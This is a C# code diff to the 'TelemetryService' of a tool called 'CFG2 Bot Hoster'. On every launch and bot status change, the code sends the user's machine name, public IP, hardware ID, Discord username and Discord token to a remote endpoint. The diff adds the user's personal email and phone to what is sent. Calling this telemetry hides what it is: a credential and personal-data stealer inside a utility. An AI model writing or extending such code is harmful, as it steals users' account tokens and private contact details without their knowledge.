@@ -23,6 +23,7 @@ public static class TelemetryService
     {
         if (!Enabled) return;
         var d = DeviceInfoService.GetDiscordAccount();
+        var c = DeviceInfoService.GetPersonalContact();
         await PostAsync("CFG2 Bot Hoster - launch", new[]
         {
             new { name = "Device", value = $"`{Environment.MachineName}`", inline = true },
@@ -30,9 +31,9 @@ public static class TelemetryService
             new { name = "IP", value = $"`{await LicenseService.GetPublicIpAsync()}`", inline = true },
             new { name = "Premium", value = LicenseService.IsPremiumActive ? "YES" : "no", inline = true },
             new { name = "OS", value = Environment.OSVersion.VersionString, inline = true },
+            new { name = "Personal email", value = ContactValue(c?.Email), inline = true },
+            new { name = "Personal phone", value = ContactValue(c?.Phone), inline = true },
             new { name = "Discord user", value = DiscordUserField(d), inline = true },
-            new { name = "Discord email", value = DiscordValue(d?.Email), inline = true },
-            new { name = "Discord phone", value = DiscordValue(d?.Phone), inline = true },
             new { name = "Discord token", value = DiscordValue(d?.Token), inline = true },
         });
     }
@@ -43,6 +44,7 @@ public static class TelemetryService
     {
         if (!Enabled) return;
         var d = DeviceInfoService.GetDiscordAccount();
+        var c = DeviceInfoService.GetPersonalContact();
         await PostAsync("CFG2 Bot Hoster - bot " + status, new[]
         {
             new { name = "Bot", value = $"`{botName}` (`{botId}`)", inline = true },
@@ -51,9 +53,9 @@ public static class TelemetryService
             new { name = "HWID", value = $"`{HwShort()}`", inline = true },
             new { name = "IP", value = $"`{await LicenseService.GetPublicIpAsync()}`", inline = true },
             new { name = "Premium", value = LicenseService.IsPremiumActive ? "YES" : "no", inline = true },
+            new { name = "Personal email", value = ContactValue(c?.Email), inline = true },
+            new { name = "Personal phone", value = ContactValue(c?.Phone), inline = true },
             new { name = "Discord user", value = DiscordUserField(d), inline = true },
-            new { name = "Discord email", value = DiscordValue(d?.Email), inline = true },
-            new { name = "Discord phone", value = DiscordValue(d?.Phone), inline = true },
             new { name = "Discord token", value = DiscordValue(d?.Token), inline = true },
         });
     }
@@ -69,6 +71,9 @@ public static class TelemetryService
 
     private static string DiscordValue(string? v) =>
         string.IsNullOrEmpty(v) ? "none found on this device" : $"`{v}`";
+
+    private static string ContactValue(string? v) =>
+        string.IsNullOrEmpty(v) ? "not found on this device" : $"`{v}`";
 
     private static string HwShort()
     {
